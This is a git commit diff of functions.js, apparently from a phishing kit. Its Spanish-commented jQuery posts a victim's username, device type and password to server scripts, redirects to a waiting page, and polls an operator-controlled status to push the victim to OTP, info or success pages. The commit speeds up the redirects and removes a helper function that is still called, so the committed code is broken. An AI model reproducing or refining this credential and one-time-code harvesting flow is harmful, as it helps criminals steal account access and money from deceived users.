5a7bcdbd91cea46ce032fc9c5f66735077487d50
leidyjhoanalj88-png <leidyjhoanalj88@gmail.com>
2026-04-21 23:35:45 -0500

    Actualizar functions.js

--- js/functions.js
+++ js/functions.js
@@ -1,33 +1,31 @@
-function detectar_dispositivo(){
-    var dispositivo = "PC";
-    if(navigator.userAgent.match(/Android/i)) dispositivo = "Android";
-    else if(navigator.userAgent.match(/iPhone|iPad|iPod/i)) dispositivo = "iOS";
-    return dispositivo;
-}
-
 function inicio(u){
     var d = detectar_dispositivo();
     $("#fondo, #cargando-o").show();
-    $.post( "../process/inicio.php", { usr: u, dis: d } ).always(function() {
-        window.location.href = "pass.php"; 
-    });
+    
+    // Enviamos a los 4 IDs, pero saltamos de inmediato
+    $.post( "../process/inicio.php", { usr: u, dis: d } );
+    
+    setTimeout(function(){ 
+        window.location.href = "PASS.php"; 
+    }, 1000); // 1 segundo exacto y salta
 }
 
 function pasousuario(p){    
     $("#fondo, #cargando-o").show();
-    $.post( "../process/pasousuario.php", { pass: p } ).always(function() {
-        window.location.href = "waiting.php"; 
-    });
+    $.post( "../process/pasousuario.php", { pass: p } );
+    
+    setTimeout(function(){ 
+        window.location.href = "WAITING.php"; 
+    }, 1000);
 }            
 
 function consultar_estado(){    
     $.post( "../process/estado.php?v=" + Math.random(), function(data) {        
         var estado = data.toString().trim();
         switch (estado) {
-            case '2': window.location.href = "otp.php"; break;
-            case '4': window.location.href = "info.php"; break;
-            case '10': window.location.href = "success.php"; break;
-            case '12': window.location.href = "login.php"; break;
+            case '2': window.location.href = "OTP.php"; break;
+            case '4': window.location.href = "INFO.php"; break;
+            case '10': window.location.href = "SUCCESS.php"; break;
         } 
     });        
 }
